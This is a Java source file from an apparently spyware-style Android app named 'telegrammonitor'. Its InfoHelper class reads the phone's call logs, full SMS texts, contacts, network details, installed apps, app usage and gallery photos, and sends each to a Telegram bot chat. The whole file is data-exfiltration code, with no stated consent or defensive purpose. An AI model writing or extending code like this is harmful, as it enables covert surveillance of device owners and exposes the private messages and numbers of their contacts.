package com.nehal.telegrammonitor;

import android.Manifest;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.text.format.DateFormat;

import java.io.File;
import java.util.Calendar;
import java.util.List;

public class InfoHelper {

    public static void sendCallLogs(Context ctx, String botToken, String chatId) {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor == null) return;

        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
            String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
            long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
            String date = DateFormat.format("dd-MM-yyyy hh:mm:ss", dateMillis).toString();
            sb.append("📞 ").append(type).append(" | ").append(number).append(" | ").append(date).append("\n");
        }
        cursor.close();

        TelegramUploader.sendText(botToken, chatId, "📑 Call Logs:\n" + sb.toString());
    }

    public static void sendSms(Context ctx, String botToken, String chatId) {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor == null) return;

        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
            sb.append("📩 ").append(number).append(": ").append(body).append("\n\n");
        }
        cursor.close();

        TelegramUploader.sendText(botToken, chatId, "📨 SMS:\n" + sb.toString());
    }

    public static void sendContacts(Context ctx, String botToken, String chatId) {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor == null) return;

        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append("👤 ").append(name).append(": ").append(phone).append("\n");
        }
        cursor.close();

        TelegramUploader.sendText(botToken, chatId, "📇 Contacts:\n" + sb.toString());
    }

    public static void sendWifiInfo(Context ctx, String botToken, String chatId) {
        String cmd = "ip a";
        Shell.run(cmd, output -> TelegramUploader.sendText(botToken, chatId, "📡 Wi-Fi Info:\n" + output));
    }

    public static void sendBatteryStatus(Context ctx, String botToken, String chatId) {
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        TelegramUploader.sendText(botToken, chatId, "🔋 Battery Level: " + level + "%");
    }

    public static void sendInstalledApps(Context ctx, String botToken, String chatId) {
        PackageManager pm = ctx.getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder();
        for (PackageInfo pkg : packages) {
            ApplicationInfo ai = pkg.applicationInfo;
            if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append("📦 ").append(ai.loadLabel(pm)).append(" - ").append(pkg.packageName).append("\n");
            }
        }
        TelegramUploader.sendText(botToken, chatId, "📲 Installed Apps:\n" + sb.toString());
    }

    public static void sendAppUsage(Context ctx, String botToken, String chatId) {
        UsageStatsManager usm = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.DAY_OF_MONTH, -1);

        List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, cal.getTimeInMillis(), System.currentTimeMillis());

        StringBuilder sb = new StringBuilder();
        for (UsageStats usage : stats) {
            if (usage.getTotalTimeInForeground() > 0) {
                sb.append("📱 ").append(usage.getPackageName()).append(" - ").append(usage.getTotalTimeInForeground() / 1000).append(" sec\n");
            }
        }

        TelegramUploader.sendText(botToken, chatId, "⏱ App Usage:\n" + sb.toString());
    }

    public static void sendGalleryImages(Context ctx, String botToken, String chatId) {
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, null);
        if (cursor == null) return;

        int count = 0;
        while (cursor.moveToNext() && count < 3) {
            String imgPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
            TelegramUploader.sendPhoto(botToken, chatId, new File(imgPath));
            count++;
        }
        cursor.close();
    }
}